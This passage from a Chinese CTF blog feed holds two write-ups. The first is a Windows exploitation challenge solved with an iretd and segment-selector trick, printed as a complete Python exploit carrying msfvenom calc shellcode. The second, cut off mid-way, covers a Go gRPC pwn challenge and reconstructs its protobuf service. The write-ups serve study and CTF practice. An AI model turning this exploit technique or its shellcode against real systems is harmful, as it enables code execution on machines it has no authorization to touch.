)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  [+] Message received: %s\n&quot;</span>, CmdLine);</span><br><span class="line">    <span class="built_in">send</span>(a1, CmdLine, lena, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  [-] Unsupported message\n&quot;</span>);</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    <span class="built_in">send</span>(a1, aUnsupportedMes_1, v2 + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="string">&#x27;X&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    off_14000C000 = (__int64 (__fastcall *)(_QWORD))&amp;::buf[lena];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">off_14000C000</span>(CmdLine);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内存copy函数，某些字符在copy时会被替换为0。（看到后面发现这是一个提示？</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF736B511B0</span><span class="params">(_BYTE *a1, _BYTE *a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a3;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a2 == <span class="number">0x2B</span> || *a2 == <span class="number">0x33</span> )</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      *a1 = *a2;</span><br><span class="line">    ++a2;</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>int16 -&gt; unsigned int16 可以是负数转化后变为一个很大的数字，这样可以读的缓冲区就很大了。</p>
<p>可以修改 v7 为 <code>X</code>，但是不能太长，因为存在GS保护。</p>
<p>最后执行这个函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v7 == <span class="string">&#x27;X&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    off_14000C000 = (__int64 (__fastcall *)(_QWORD))&amp;::buf[lena];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">off_14000C000</span>(CmdLine);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这个一个virtualAlloc的区域</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">buf = (<span class="type">char</span> *)<span class="built_in">VirtualAlloc</span>((LPVOID)<span class="number">0x10000000</span>, <span class="number">0x1000</span>ui64, <span class="number">0x3000</span>u, <span class="number">0x40</span>u);</span><br><span class="line"></span><br><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>最后一个属性：0x40代表 <strong>PAGE_EXECUTE_READWRITE</strong> 表明这片区域可执行。因此最后是跳转到我们输入的shellcode执行。</p>
<p>初始化的时候，写了数据，反编译后</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">debug033:<span class="number">0000000010000000</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000001</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000002</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000003</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000004</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000005</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000006</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000007</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000008</span>                 pop     rax</span><br><span class="line">debug033:<span class="number">0000000010000009</span>                 pop     rax</span><br><span class="line">debug033:<span class="number">000000001000000</span>A                 pop     rax</span><br><span class="line">debug033:<span class="number">000000001000000B</span>                 pop     rax</span><br><span class="line">debug033:<span class="number">000000001000000</span>C                 pop     rax</span><br><span class="line">debug033:<span class="number">000000001000000</span>D                 pop     rax</span><br><span class="line">debug033:<span class="number">000000001000000</span>E                 pop     rax</span><br><span class="line">debug033:<span class="number">000000001000000F</span>                 iret</span><br></pre></td></tr></table></figure>

<p>无论如何最后还是得执行这一段代码中的某些部分</p>
<p>iret 的作用：IRET(interrupt return)中断返回，中断服务程序的最后一条指令。IRET指令将推入堆栈的段地址和偏移地址弹出，使程序返回到原来发生中断的地方。相当于<strong>POP <code>RIP|CS|RFLAGS|SP|SS</code></strong></p>
<p>这里主要是段寄存器的处理，因为与寻址有关。在 real mode 下 <code>cs:ip = cs &lt;&lt; 4 + ip</code></p>
<p>但是在保护模式下段寄存器依然是16位，但是意义大不一样。参考：<a href="https://utopianfuture.github.io/X86/Segment-data-structure.html">段式管理的数据结构</a></p>
<p>GDTR保存GDT的相关信息，也就是GDT表的起始地址和大小</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> limit;    <span class="comment">// GDT 最大长度</span></span><br><span class="line">    <span class="type">uint64_t</span> base;     <span class="comment">// GDT 基地址，在x86下是 uint32_t</span></span><br><span class="line">&#125; GDTR;</span><br></pre></td></tr></table></figure>

<p>GDT表中的内容：段描述符，记录段的信息</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> limit_low;         <span class="comment">// 段限界 0-15 bits (Segment Limit)</span></span><br><span class="line">    <span class="type">uint16_t</span> base_low;          <span class="comment">// 基地址 0-15 bits (Base Address)</span></span><br><span class="line">    <span class="type">uint8_t</span>  base_mid;          <span class="comment">// 基地址 16-23 bits (Base Address)</span></span><br><span class="line">    <span class="type">uint8_t</span>  type : <span class="number">4</span>;          <span class="comment">// 段类型 (Segment Type)</span></span><br><span class="line">    <span class="type">uint8_t</span>  s : <span class="number">1</span>;             <span class="comment">// 描述符类型 (Descriptor Type, 0=system, 1=code or data)</span></span><br><span class="line">    <span class="type">uint8_t</span>  dpl : <span class="number">2</span>;           <span class="comment">// 描述符特权级别 (Descriptor Privilege Level)</span></span><br><span class="line">    <span class="type">uint8_t</span>  p : <span class="number">1</span>;             <span class="comment">// 段存在位 (Segment Present)</span></span><br><span class="line">    <span class="type">uint8_t</span>  limit_high : <span class="number">4</span>;    <span class="comment">// 段限界 16-19 bits (Segment Limit)</span></span><br><span class="line">    <span class="type">uint8_t</span>  avl : <span class="number">1</span>;           <span class="comment">// 可用位 (Available for use by system software)</span></span><br><span class="line">    <span class="type">uint8_t</span>  l : <span class="number">1</span>;             <span class="comment">// 64-bit code segment (0 for non-64-bit code segments)</span></span><br><span class="line">    <span class="type">uint8_t</span>  db : <span class="number">1</span>;            <span class="comment">// 默认操作大小 (Default Operation Size, 0=16-bit, 1=32-bit)</span></span><br><span class="line">    <span class="type">uint8_t</span>  g : <span class="number">1</span>;             <span class="comment">// 粒度 (Granularity, 0=byte, 1=4KB)</span></span><br><span class="line">    <span class="type">uint8_t</span>  base_high;         <span class="comment">// 基地址 24-31 bits (Base Address)</span></span><br><span class="line">&#125; SegmentDescriptor;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Base <span class="number">31</span>:<span class="number">24</span>  | G | D/B | L | AVL | Limit <span class="number">19</span>:<span class="number">16</span> | P | DPL | S  | Type | Base <span class="number">23</span>:<span class="number">16</span> |  Base <span class="number">15</span>:<span class="number">0</span>  | Limit <span class="number">15</span>:<span class="number">0</span> |</span><br><span class="line">-------------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>段寄存器保存16位宽的段选择符segment selector</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 段选择器结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> rpl  : <span class="number">2</span>;  <span class="comment">// 请求特权级别 (Request Privilege Level)</span></span><br><span class="line">    <span class="type">uint16_t</span> ti   : <span class="number">1</span>;  <span class="comment">// 描述符表指示器 (Table Indicator, 0 for GDT, 1 for LDT)</span></span><br><span class="line">    <span class="type">uint16_t</span> index: <span class="number">13</span>; <span class="comment">// 描述符表索引 (Descriptor Table Index)</span></span><br><span class="line">&#125; SegmentSelector;</span><br></pre></td></tr></table></figure>

<p>cs,ss的值代表描述符在 LDT&#x2F;GDT 中的偏移。</p>
<ul>
<li>TI &#x3D; 0 使用GDT</li>
<li>TI &#x3D; 1 使用LDT</li>
</ul>
<p>并且在 amd64 cpu下，段寄存器相对固定<br>- 0x00: 恒为0</p>
<ul>
<li><strong>内核模式</strong>：<ul>
<li><code>CS</code>寄存器的值为<code>0x10</code>，对应于GDT中的<code>KERNEL_CODE_SELECTOR</code>。</li>
<li><code>SS</code> 为 <code>0x18</code></li>
</ul>
</li>
<li><strong>用户模式</strong>：<ul>
<li><code>CS</code>寄存器的值为<code>0x33</code>，对应于GDT中的<code>USER_CODE_SELECTOR</code>，并设置RPL（请求特权级）为3。</li>
<li><code>SS</code> 为 0x28</li>
</ul>
</li>
</ul>
<p>我们得到基址就可以获得 <code>cs:ip 的值</code></p>
<p>使用IDA调试发生错误，使用WinDbgX调试</p>
<p>观察rsp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dq @rsp</span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e8d0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e8e0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e8f0  <span class="number">00000f</span>02`<span class="number">00001000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e900  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e910  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e920  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e930  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e940  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br></pre></td></tr></table></figure>

<p>因此我们先让此函数执行6次 <code>pop rax</code>，在执行<code>iretd</code>（WinDbgX显示） 从而控制ss等寄存器。</p>
<p>我们程序原本的ss</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; r ss</span><br><span class="line">ss=<span class="number">002</span>b</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; r cs</span><br><span class="line">cs=<span class="number">0033</span></span><br></pre></td></tr></table></figure>

<p>这里就是比较难的点，需要我们知道 x86_64下，iretd 需要pop的是x86的cs和ss。也就是寻找一个 <code>SegmentDescriptor.l = 0</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dg [selector [number]]</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; r gdtr</span><br><span class="line">gdtr=fffff8027bb59fb0</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dg <span class="number">0x23</span></span><br><span class="line">                                                    P Si Gr Pr Lo</span><br><span class="line">Sel        Base              Limit          Type    l ze an es ng Flags</span><br><span class="line">---- ----------------- ----------------- ---------- - -- -- -- -- --------</span><br><span class="line"><span class="number">0020</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`ffffffff Code RE Ac <span class="number">3</span> Bg Pg P  Nl <span class="number">00000</span>cfb</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dq fffff8027bb59fb0+<span class="number">0x20</span></span><br><span class="line">fffff802`<span class="number">7b</span>b59fd0  <span class="number">00</span>cffb00`<span class="number">0000f</span>fff <span class="number">00</span>cff300`<span class="number">0000f</span>fff</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; .formats <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line">  Decimal: <span class="number">58541297597743103</span></span><br><span class="line">  <span class="built_in">Decimal</span> (<span class="type">unsigned</span>) : <span class="number">58541297597743103</span></span><br><span class="line">  Octal:   <span class="number">0003177660000000177777</span></span><br><span class="line">  Binary:  <span class="number">00000000</span> <span class="number">11001111</span> <span class="number">11111011</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">11111111</span> <span class="number">11111111</span></span><br><span class="line">  Chars:   ........</span><br><span class="line">  Time:    Thu Jul  <span class="number">6</span> <span class="number">11</span>:<span class="number">09</span>:<span class="number">19.774</span> <span class="number">1786</span> (UTC + <span class="number">8</span>:<span class="number">00</span>)</span><br><span class="line">  Float:   low <span class="number">9.18341e-041</span> high <span class="number">1.91e-038</span></span><br><span class="line">  Double:  <span class="number">9.10834e-305</span></span><br></pre></td></tr></table></figure>

<p>观察 <code>l</code> 位为0，代表为32位。同理找到 <code>0x53</code> data segment</p>
<ul>
<li>参考：<a href="https://www.malwaretech.com/2014/02/the-0x33-segment-selector-heavens-gate.html">The 0x33 Segment Selector</a></li>
</ul>
<p>eflags可以直接调试得出，可以不改变</p>
<p>iretd 会转化一次架构位为x86架构，我们生成的shellcode为x64，再次转化架构也就是 <code>jmp cs:ip</code> 执行再次转化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p64</span>(<span class="params">v</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32</span>(<span class="params">v</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p16</span>(<span class="params">v</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;H&quot;</span>, v)</span><br><span class="line"></span><br><span class="line"><span class="comment"># addr = &quot;192.168.85.128&quot;</span></span><br><span class="line">addr = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">31415</span></span><br><span class="line"></span><br><span class="line">conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">conn.connect((addr, port))</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> conn:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Error connect&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;Hello\x00&quot;</span></span><br><span class="line">conn.send(payload)</span><br><span class="line"><span class="built_in">print</span>(conn.recv(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">RIP|CS|RFLAGS|SP|SS</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">ctx = p32(<span class="number">0x10000014</span>) + p32(<span class="number">0x23</span>) + p32(<span class="number">0x202</span>) + p32(<span class="number">0x10000000</span>) + p32(<span class="number">0x53</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># msfvenom -a x64 --platform Windows -p windows/x64/exec cmd=&quot;calc&quot; -f python -v shellcode</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xda\xff\xd5\x63\x61\x6c\x63\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(&quot;JMP 0x33:0x1000001c&quot;)</span></span><br><span class="line"><span class="string">b&#x27;\xea\x1c\x00\x00\x103\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">jmp_shellcode = <span class="string">b&#x27;\xea\x1c\x00\x00\x103\x00&#x27;</span> <span class="comment"># JMP 0x33:0x1000001c</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(&quot;mov rsp, rcx&quot;)</span></span><br><span class="line"><span class="string">b&#x27;H\x89\xcc&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">origin_rsp = <span class="string">b&#x27;H\x89\xcc&#x27;</span></span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&quot;\x90&quot;</span> * <span class="number">7</span></span><br><span class="line">header = p64(<span class="number">0x323230326F6B45</span>)</span><br><span class="line">header += <span class="string">b&quot;T&quot;</span></span><br><span class="line">header += p16(<span class="number">0x8000</span>)</span><br><span class="line">data = ctx</span><br><span class="line">data += jmp_shellcode + origin_rsp</span><br><span class="line">data += shellcode</span><br><span class="line">data += <span class="string">b&quot;\x90&quot;</span> * (<span class="number">0xF00</span> - <span class="built_in">len</span>(data))</span><br><span class="line">data += <span class="string">b&quot;X&quot;</span> + padding</span><br><span class="line">conn.send(header + data)</span><br></pre></td></tr></table></figure>

<p>第一次接触到段寄存器这种玩法，狠狠的学习了😤</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://infosecwriteups.com/bfs-ekoparty-2022-exploitation-challenges-7deffce64ee4">BFS Ekoparty 2022 Exploitation Challenges</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>DubheCTF-ggbond</title>
    <url>/2024/03/20/DubheCTF-ggbond/</url>
    <content><![CDATA[<blockquote>
<p>golang pwn</p>
</blockquote>
<span id="more"></span>

<h2 id="ggbond"><a href="#ggbond" class="headerlink" title="ggbond"></a>ggbond</h2><p>打开，golang protobuf grpc服务，但是程序保护开的少，加上go静态编译，保证gadget是够用的，并且符号表比较完整</p>
<p>学习一下protobuf: <a href="https://zhuanlan.zhihu.com/p/436041011">深入解析protobuf</a></p>
<p>每个消息必有类型和字段编号，也存在可选的字段</p>
<ul>
<li><strong>optional</strong>: message 可以包含该字段零次或一次（不超过一次）。</li>
<li><strong>repeated</strong>: 该字段可以在消息中重复任意多次（包括零）。其中重复值的顺序会被保留。在开发语言中就是数组和列表</li>
</ul>
<p>每个字段有唯一编号，在二进制流中标识字段</p>
<ul>
<li>1 到 15 范围内的字段编号需要一个字节进行编码，编码结果将同时包含编号和类型</li>
<li>16 到 2047 范围内的字段编号占用两个字节。因此，非常频繁出现的 message 元素保留字段编号 1 到 15。</li>
<li>字段最小数字为1，最大字段数为2^29 - 1。</li>
<li>19000 ~ 19999 保留</li>
</ul>
<p>grpcurl的结果：<a href="https://github.com/grpc/grpc-go/blob/master/Documentation/server-reflection-tutorial.md">server-reflection-tutorial</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest</span><br><span class="line">$ grpcurl -plaintext 127.0.0.1:1337 list</span><br><span class="line">Failed to list services: server does not support the reflection API</span><br></pre></td></tr></table></figure>

<p>和官方案例有点像，因此编译官方案例: <a href="https://grpc.io/docs/languages/go/quickstart/">Quick start | Go | gRPC</a></p>
<p>下载源码 <code>go build</code> 然后IDA对比一下</p>
<p><a href="https://scottgold.github.io/2020/11/16/%E9%98%85%E8%AF%BBprotobuf-go%E4%BB%A3%E7%A0%81.html">阅读protobuf Go代码</a>:可以找到一点 proto message 和 golang struct 的关系，开始处有三个字段，并且名称修改为大驼峰</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> OrderRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">	state         protoimpl.MessageState</span><br><span class="line">	sizeCache     protoimpl.SizeCache</span><br><span class="line">	unknownFields protoimpl.UnknownFields</span><br><span class="line"></span><br><span class="line">	<span class="comment">// proto message</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此ggbond存在5种request，以及其对应的response。</p>
<p>通过官方helloworld寻找service</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;google.golang.org/grpc/examples/helloworld/helloworld&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> helloworld;</span><br><span class="line"></span><br><span class="line">service Greeter &#123;</span><br><span class="line">  <span class="comment">// Sends a greeting</span></span><br><span class="line">  rpc SayHello (HelloRequest) returns (HelloReply) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.(*server).SayHello</span></span><br><span class="line">retval_840CC0 __golang main__ptr_server_SayHello</span><br><span class="line"></span><br><span class="line"><span class="comment">// google.golang.org/grpc/examples/helloworld/helloworld._Greeter_SayHello_Handler</span></span><br><span class="line">RTYPE *__golang google_golang_org_grpc_examples_helloworld_helloworld__Greeter_SayHello_Handler</span><br></pre></td></tr></table></figure>

<p>同理</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main/ggbond._GGBondServer_Handler_Handler</span></span><br><span class="line">RTYPE *__golang main_ggbond__GGBondServer_Handler_Handle</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.(*server).Handler</span></span><br><span class="line">retval_848680 __golang main__ptr_server_Handle</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;ggbond&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> ggbond;</span><br><span class="line"></span><br><span class="line">service GGBondServer &#123;</span><br><span class="line">  rpc Handler(Request) returns (Response) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用Docker搭建环境，尝试一下交互</p>
<p>首先生成py文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. ggbond.proto</span><br></pre></td></tr></table></figure>

<p>通信报错</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grpc._channel._InactiveRpcError: &lt;_InactiveRpcError of RPC that terminated with:</span><br><span class="line">	status = StatusCode.UNIMPLEMENTED</span><br><span class="line">	details = <span class="string">&quot;unknown service ggbond.GGBondServer&quot;</span></span><br></pre></td></tr></table></figure>

<p>找到正确的service名称</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">p_grpc_UnaryServerInfo-&gt;FullMethod.ptr = <span class="string">&quot;/GGBond.GGBondServer/Handler&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>所以最终，大体是如下的</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;GGBond&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> GGBond;</span><br><span class="line"></span><br><span class="line">service GGBondServer &#123;</span><br><span class="line">  rpc Handler(Request) returns (Response) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message IsRequest &#123;</span><br><span class="line">  <span class="type">uint64</span> tab = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint64</span> data = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message IsResponse &#123;</span><br><span class="line">  <span class="type">uint64</span> tab = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint64</span> data = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Request &#123;</span><br><span class="line">  IsRequest request = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Response &#123;</span><br><span class="line">  <span class="type">uint64</span> tab = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint64</span> data = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message WhoamiRequest &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message WhoamiResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RoleChangeRequest 